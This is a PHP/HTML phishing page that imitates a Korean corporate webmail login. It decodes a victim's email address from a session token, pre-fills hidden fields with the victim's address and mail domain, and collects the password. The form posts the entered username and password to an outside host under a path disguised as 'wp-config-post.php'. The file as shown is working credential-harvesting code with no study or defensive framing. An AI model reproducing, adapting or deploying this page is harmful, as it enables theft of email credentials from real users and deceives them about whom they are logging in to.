<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>&#54980;&#51060;&#51592;&#47700;&#51068; - &#45824;&#54620;&#48124;&#44397; 1&#50948; &#44592;&#50629;&#47700;&#51068;</title>
<link rel="Shortcut Icon" href="http://mail.ynre.co.kr/images/Mail2.ico">
</head>
  <style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text],
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 57px;
  width: 430px;
  padding: 15px;
  margin: 0;
  background: #fff;
  border: #6685c4 solid 1px;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 20px;
  line-height: 50px;
  vertical-align: top;
  color: #404040;
  }
  input[type=text]:focus,
  input[type=password]:focus {
  outline: none;
  background-color: #fafcff;
  border: 2px solid #6685c4;
  border-bottom: 2px solid #6685c4;
  }
  </style>
<body background="https://i.ibb.co/qYR1dzD/t5FbtaX.png">
<div align="center">
	<table border="0" width="809" cellspacing="0" cellpadding="0" >
		<tr>
			<td height="20">
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td width="2"></td>
							<td width="148">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td height="25"></td>
								</tr>
								<tr>
									<td>
									<img border="0" src="https://i.ibb.co/BKtgCqq/logo.jpg" width="148" height="43"></td>
								</tr>
								<tr>
									<td height="15"></td>
								</tr>
							</table>
							</td>
							<td>&nbsp;</td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="55" ></td>
				</tr>
				<tr>
					<td width="809" height="452" background="https://i.ibb.co/9nVqSMh/bg.png">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">

					<form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
						<tr>
							<td>&nbsp;</td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="190"></td>
									<td>
									   <input type="text" required placeholder="&#51060;&#47700;&#51068; (&#50696;: name@company.kr)" name="user" value="" autofocus >
                                                                           <input type="hidden" name="domain" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
                                                                           <input type="hidden" required name="link" value="http://mail.<?php echo $ddomain;?>" >
                                                                           <input type="hidden" required name="sender" value="Whoismail" >
									</td>
									<td width="189">&nbsp;</td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="12"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="190"></td>
									<td>
									   <input type="password" required placeholder="&#48708;&#48128;&#48264;&#54840;" name="passwd" value="" size="20" ></td>
									<td width="189">&nbsp;</td>
								</tr>
							</table>
							</td>
						</tr>						
						<tr>
							<td height="11"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="190"></td>
									<td>
									<input type="image" src="https://i.ibb.co/By3m5K5/btn-login.gif" width="430" height="51"></td>
									<td width="189">&nbsp;</td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="122"></td>
						</tr>
						</form>
					</table>
					</td>
				</tr>
				<tr>
					<td>&nbsp;</td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>
</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>